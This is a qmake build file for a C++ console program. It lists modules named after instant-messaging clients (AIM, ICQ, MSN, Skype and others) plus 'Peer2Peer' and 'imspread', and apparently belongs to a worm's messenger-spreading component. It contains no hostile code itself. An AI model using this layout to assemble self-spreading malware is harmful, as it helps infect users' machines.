TEMPLATE = app
CONFIG += console c++11
CONFIG -= app_bundle
CONFIG -= qt

#QMAKE_CXXFLAGS_RELEASE += -O
#QMAKE_CXXFLAGS_RELEASE += -O1
#QMAKE_CXXFLAGS_RELEASE -= -O2
#QMAKE_CXXFLAGS_RELEASE += -O3

SOURCES += \
        Clients/Aim.cpp \
        Clients/Gaim.cpp \
        Clients/GoogleTalk.cpp \
        Clients/Icq.cpp \
        Clients/Msn.cpp \
        Clients/PalTalk.cpp \
        Clients/Skype.cpp \
        Peer2Peer.cpp \
        imspread.cpp \
        main.cpp

HEADERS += \
    Clients/Aim.h \
    Clients/Gaim.h \
    Clients/GoogleTalk.h \
    Clients/Icq.h \
    Clients/Msn.h \
    Clients/PalTalk.h \
    Clients/Skype.h \
    Peer2Peer.h \
    imspread.h \
    includes.h \
    main.h

#LIBS += libws2_32
